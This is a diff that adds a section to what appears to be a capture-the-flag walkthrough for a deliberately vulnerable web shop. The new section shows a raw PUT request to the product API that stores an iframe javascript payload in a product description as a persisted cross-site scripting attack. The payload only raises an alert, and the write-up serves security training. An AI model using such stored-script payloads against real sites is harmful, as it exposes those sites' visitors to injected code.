@@ -1,5 +1,17 @@
 # Level 3
 
+## API-only XSS (XSS)
+_Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> without using the frontend application at all._
+
+Following the [Product Tampering](#product-tampering-broken-access-control) challenge, we know we can modify the product
+description:
+```
+PUT /api/Products/1
+Content-type: application/json
+
+{"description":"Hello <iframe src=\"javascript:alert(`xss`)\">"}
+```
+
 ## Admin Registration (Improper Input Validation)
 _Register as a user with administrator privileges._
 
